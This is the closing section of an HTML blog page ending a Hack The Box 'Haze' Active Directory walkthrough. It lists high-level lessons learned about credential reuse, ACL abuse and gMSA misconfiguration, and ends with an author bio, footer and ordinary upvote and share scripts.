+                        <p>This Haze Machine walkthrough provided several critical lessons applicable to Active Directory security and penetration testing:</p>
+                        <ol>
+                            <li><strong>Initial Reconnaissance is Paramount:</strong> Identifying seemingly innocuous services like Splunk can reveal high-impact vulnerabilities (e.g., path traversal) that lead directly to initial access or sensitive data. Thorough port scanning and service version enumeration are non-negotiable.</li>
+                            <li><strong>Credential Reuse is a Persistent Threat:</strong> The initial decrypted Splunk LDAP password was reusable for other domain users (Paul Taylor, Mark Adams), highlighting how a single compromise can cascade into broader network access.</li>
+                            <li><strong>BloodHound is Your Best Friend:</strong> For complex Active Directory environments, BloodHound is indispensable for visualizing relationships, identifying dangerous ACLs, and mapping out viable attack paths that might be invisible through manual enumeration.</li>
+                            <li><strong>Understand Active Directory Permissions and ACLs Deeply:</strong> The WriteOwner to GenericAll to AddKeyCredentialLink/ForceChangePassword chain is a sophisticated example of how subtle misconfigurations in permissions can lead to full account compromise. Understanding how these permissions cascade is crucial.</li>
+                            <li><strong>Group Managed Service Accounts (gMSA) are High-Value Targets:</strong> gMSAs are designed for security but can become critical privilege escalation vectors if their access control (like <code class="highlight">principalAllowToRetrievePassword</code>) is misconfigured. Attackers will actively seek out memberships in groups like <code class="highlight">gMSA_Managers</code>.</li>
+                            <li><strong>The Power of Machine Accounts:</strong> The ability for low-privileged users to create machine accounts can be a valuable stepping stone for gathering more comprehensive data (e.g., for BloodHound) or even for some forms of lateral movement.</li>
+                            <li><strong>Privilege Escalation Chains are Common:</strong> Very rarely will one exploit grant immediate SYSTEM or Domain Admin. Expect to chain multiple vulnerabilities and techniques (e.g., app exploit -> WinRM access -> gMSA compromise -> AD ACL abuse -> privilege escalation to SYSTEM).</li>
+                            <li><strong>Defense in Depth:</strong> This box demonstrates the importance of layered security. While one vulnerability was found, the subsequent steps highlight how multiple misconfigurations can be chained together for full compromise.</li>
+                        </ol>
+                    </section>
+                    
+                    <div class="cta-box">
+                        <h3>Want More Deep Dives into Cybersecurity Challenges?</h3>
+                        <p>Explore my other <a href="../index.html">write-ups and posts</a> for more insights into hacking, defense, and Active Directory security.</p>
+                    </div>
+
+                    <!-- Author Bio Section -->
+                    <div class="author-bio">
+                        <img src="../images/profile.jpg" alt="Bashir Kabir Zarewa" class="bio-image">
+                        <div class="bio-text">
+                            <h3>About Bashir Kabir Zarewa (L0C4LH057)</h3>
+                            <p>Bashir Kabir Zarewa is a passionate cybersecurity researcher and enthusiast. He specializes in ethical hacking, Active Directory security, and crafting comprehensive walkthroughs. Connect with him on <a href="https://x.com/bashirkabirz" target="_blank" rel="noopener noreferrer">Twitter</a> or <a href="https://www.linkedin.com/in/bashir-kabir-zarewa-18b67718a" target="_blank" rel="noopener noreferrer">LinkedIn</a> for more insights from the digital front lines.</p>
+                        </div>
+                    </div>
+
+                    <!-- Related Posts Section -->
+                    <div class="related-posts">
+                        <h2>You Might Also Like</h2>
+                        <ul>
+                            <li><a href="#">Walkthrough: Forest HTB (Another AD Challenge)</a></li>
+                            <li><a href="#">Deep Dive: Understanding Active Directory ACLs</a></li>
+                            <li><a href="#">Guide: Setting Up Your Pentesting Lab Environment</a></li>
+                        </ul>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <div class="container">
+                <div class="footer-content">
+                    <div class="footer-section">
+                        <h4 class="footer-title">Bashir Kabir Zarewa</h4>
+                        <p>Cybersecurity researcher and enthusiast. Exploring the depths of ethical hacking, AI security, and modern defensive strategies. Sharing insights from the digital front lines.</p>
+                    </div>
+                    <div class="footer-section">
+                        <h4 class="footer-title">Quick Links</h4>
+                        <ul class="footer-links">
+                            <li><a href="../index.html">Posts</a></li>
+                            <li><a href="../whoami.html">Whoami</a></li>
+                            <li><a href="../tools.html">Tools</a></li>
+                        </ul>
+                    </div>
+                    <div class="footer-section">
+                        <h4 class="footer-title">Connect</h4>
+                        <div class="social-links">
+                            <a href="https://x.com/bashirkabirz" title="Twitter" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a>
+                            <a href="https://github.com/L0C4LH057" title="GitHub" rel="noopener noreferrer"><i class="fab fa-github"></i></a>
+                            <a href="https://www.linkedin.com/in/bashir-kabir-zarewa-18b67718a" title="LinkedIn" rel="noopener noreferrer"><i class="fab fa-linkedin-in"></i></a>
+                        </div>
+                    </div>
+                </div>
+                <div class="copyright">
+                    &copy; 2025 Bashir Kabir Zarewa. All rights reserved. Opinions are my own.
+                </div>
+            </div>
+        </footer>
+
+        <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                // Firebase config
+                const firebaseConfig = {
+                    apiKey: "AIzaSyAM6IO689VRqYn7FS_gYTjpFTwMvB4um5Y",
+                    authDomain: "personalblog-e8d0d.firebaseapp.com",
+                    databaseURL: "https://personalblog-e8d0d-default-rtdb.europe-west1.firebasedatabase.app",
+                    projectId: "personalblog-e8d0d",
+                    storageBucket: "personalblog-e8d0d.firebasestorage.app",
+                    messagingSenderId: "746191305731",
+                    appId: "1:746191305731:web:b2802db970e04979fe2236"
+                };
+                firebase.initializeApp(firebaseConfig);
+                const db = firebase.database();
+
+                const upvoteBtn = document.getElementById('upvoteBtn');
+                const upvoteCount = document.getElementById('upvoteCount');
+                const upvotedKey = 'haze-htb-upvoted-global';
+
+                // Listen for upvote count changes
+                db.ref('upvotes/haze-htb').on('value', (snapshot) => {
+                    const count = snapshot.val() || 0;
+                    upvoteCount.textContent = count;
+                });
+
+                // Check if user already upvoted
+                if (localStorage.getItem(upvotedKey) === 'true') {
+                    upvoteBtn.disabled = true;
+                    upvoteBtn.style.opacity = 0.7;
+                }
+
+                // Upvote logic
+                upvoteBtn.addEventListener('click', function() {
+                    if (localStorage.getItem(upvotedKey) !== 'true') {
+                        const upvoteRef = db.ref('upvotes/haze-htb');
+                        upvoteRef.transaction(current => (current || 0) + 1);
+                        localStorage.setItem(upvotedKey, 'true');
+                        upvoteBtn.disabled = true;
+                        upvoteBtn.style.opacity = 0.7;
+                    }
+                });
+            });
+            document.addEventListener('DOMContentLoaded', function() {
+                const postUrl = window.location.href;
+                const postTitle = document.querySelector('.post-title').innerText;
+        
+                const twitterShare = document.getElementById('twitterShare');
+                twitterShare.href = `https://twitter.com/intent/tweet?url=${encodeURIComponent(postUrl)}&text=${encodeURIComponent(postTitle + " | Haze HTB Walkthrough by @bashirkabirz")}`; // Added Twitter handle
+                twitterShare.target = '_blank';
+        
+                const facebookShare = document.getElementById('facebookShare');
+                facebookShare.href = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(postUrl)}`;
+                facebookShare.target = '_blank';
+        
+                const linkedinShare = document.getElementById('linkedinShare');
+                linkedinShare.href = `https://www.linkedin.com/shareArticle?mini=true&url=${encodeURIComponent(postUrl)}&title=${encodeURIComponent(postTitle)}&summary=${encodeURIComponent(document.querySelector('.post-subtitle').innerText)}&source=${encodeURIComponent(window.location.origin)}`; // Added summary and source
+                linkedinShare.target = '_blank';
+        
+                const whatsappShare = document.getElementById('whatsappShare');
+                whatsappShare.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(postTitle + " " + postUrl)}`;
+                whatsappShare.target = '_blank';
+        
+                const copyLink = document.getElementById('copyLink');
+                copyLink.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    // Instead of alert, you could show a temporary message next to the button
+                    // For demonstration, keeping alert as per original request, but recommend a better UX
+                    navigator.clipboard.writeText(postUrl).then(() => {
+                        alert('Link copied to clipboard!'); 
+                    }).catch(err => {
+                        console.error('Failed to copy: ', err);
+                    });
+                });
+
+                const nativeShareBtn = document.getElementById('nativeShareBtn');
+                if (navigator.share) {
+                    nativeShareBtn.addEventListener('click', async () => {
+                        try {
+                            await navigator.share({
+                                title: postTitle,
+                                text: document.querySelector('.post-subtitle').innerText,
+                                url: postUrl,
+                            });
+                        } catch (err) {
+                            console.error("Share failed:", err.message);
+                        }
+                    });
+                } else {
+                    nativeShareBtn.style.display = 'none'; // Hide button if API not supported
+                }
+            });
+        </script>
+        <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+        <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+    </body>
+    </html>
